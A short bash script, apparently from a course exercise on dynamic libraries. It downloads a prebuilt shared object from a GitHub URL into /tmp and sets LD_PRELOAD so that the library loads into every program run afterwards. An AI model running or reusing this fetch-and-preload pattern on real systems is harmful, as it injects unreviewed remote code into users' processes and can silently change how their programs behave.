#!/bin/bash
wget -P /tmp/ https://raw.github.com/SwitteeFranca2-0/alx-low_level_programming/master/0x18-dynamic_libraries/number.so
export LD_PRELOAD=/tmp/number.so
